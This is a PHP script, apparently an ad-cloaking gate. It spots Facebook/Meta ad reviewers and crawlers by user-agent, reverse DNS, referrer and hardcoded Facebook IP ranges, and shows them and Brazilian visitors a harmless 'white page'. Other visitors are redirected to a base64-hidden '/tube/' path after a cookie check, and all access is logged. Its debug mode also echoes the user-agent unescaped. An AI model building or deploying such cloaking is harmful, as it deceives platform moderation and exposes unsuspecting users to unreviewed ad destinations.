<?php
ob_start();

// Inclui o autoloader do Composer para carregar a biblioteca GeoIP2
require __DIR__ . '/vendor/autoload.php';

use GeoIp2\Database\Reader;

$__white = __DIR__ . base64_decode('L3NpdGUvaW5kZXguaHRtbA==');
$__redirect = base64_decode('L3R1YmUv');

function ip_in_range($ip, $range) {
    if (strpos($range, '/') === false) $range .= '/32';
    [$subnet, $bits] = explode('/', $range);
    // CORREÇÃO: Operador bitwise ~ (til) em vez de ‾ (overline)
    return (ip2long($ip) & ~((1 << (32 - $bits)) - 1)) === (ip2long($subnet) & ~((1 << (32 - $bits)) - 1));
}

function is_bot_or_spy($ua, $ip, $ref) {
    $host = gethostbyaddr($ip);

    $patterns = [
        'facebookexternalhit', 'Facebot', 'facebookcatalog', 'Meta',
        'AdsBot', 'adlibrary', 'crawler', 'WhatsApp', 'TelegramBot',
        'Slackbot', 'Discordbot', 'Googlebot', 'bingbot'
    ];

    $facebook_ips = [
        '31.13.0.0/16', '66.220.144.0/20', '69.63.176.0/20',
        '69.171.224.0/19', '129.134.0.0/16', '157.240.0.0/16',
        '173.252.64.0/18', '179.60.192.0/22', '185.60.216.0/22',
        '204.15.20.0/22'
    ];

    foreach ($facebook_ips as $range) {
        if (ip_in_range($ip, $range)) return true;
    }

    foreach ($patterns as $p) {
        if (
            stripos($ua, $p) !== false ||
            stripos($host, 'facebook') !== false ||
            stripos($ref, 'facebook.com/ads') !== false
        ) {
            return true;
        }
    }

    return false;
}

/**
 * Função de geolocalização usando GeoLite2 local (mais rápido e sem limites de requisição).
 * O cache de arquivo geo_cache.json foi removido, pois o GeoLite2 é rápido o suficiente.
 * @param string $ip
 * @return string Código do país (ex: BR, US) ou vazio se não encontrar.
 */
function get_country($ip) {
    $databaseFile = __DIR__ . '/GeoLite2-Country.mmdb';

    if (!file_exists($databaseFile)) {
        // Se o arquivo do banco de dados não existir, retorna vazio para cair na White Page
        return '';
    }

    try {
        $reader = new Reader($databaseFile);
        $record = $reader->country($ip);
        return $record->country->isoCode ?? '';
    } catch (\Exception $e) {
        // Em caso de erro (ex: IP privado, IP inválido), retorna vazio
        return '';
    }
}

function log_access($ip, $ua, $status, $path = '/') {
    $country = get_country($ip);
    $utm_parts = [];
    foreach (["utm_source", "utm_campaign", "utm_medium", "utm_content", "utm_term"] as $k) {
        if (!empty($_GET[$k])) {
            $utm_parts[] = "$k={$_GET[$k]}";
        }
    }
    $utm = implode(' | ', $utm_parts);
    // CORREÇÃO: Codificação de caracteres na string de log
    $log_line = sprintf("[%s] IP: %s | Localização: %s | Status: %s | UA: %s | Path: %s\n",
        date('Y-m-d H:i:s'), $ip, $country, $status, $ua, $path);
    // CORREÇÃO: Criação do diretório de logs se não existir
    if (!is_dir(__DIR__ . '/logs')) {
        mkdir(__DIR__ . '/logs', 0777, true);
    }
    file_put_contents(__DIR__ . '/logs/access.log', $log_line, FILE_APPEND);
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = $_SERVER['HTTP_REFERER'] ?? '';
$path = $_SERVER['REQUEST_URI'] ?? '/';
$cookie_set = isset($_COOKIE['real_user']);
$country = get_country($ip);

if (isset($_GET['debug'])) {
    echo "<h1>DEBUG MODE</h1>";
    // CORREÇÃO: Codificação de caracteres no modo debug
    echo "IP: $ip<br>País: $country<br>UA: $ua<br>Cookie: " . ($cookie_set ? 'SIM' : 'NÃO') . "<br><hr>";
    exit;
}

if (is_bot_or_spy($ua, $ip, $ref)) {
    log_access($ip, $ua, 'SPY/BOT/ASN - WHITE', $path);
    readfile($__white);
    exit;
}

if (!$cookie_set) {
    echo '<script>document.cookie = "real_user=1; path=/"; location.reload();</script>';
    exit;
}

if ($country === 'BR' || empty($country)) {
    log_access($ip, $ua, 'HUMANO BR - WHITE', $path);
    readfile($__white);
    exit;
}

log_access($ip, $ua, 'HUMANO FORA BR - REDIRECIONADO', $path);
header("Location: $__redirect");
exit;
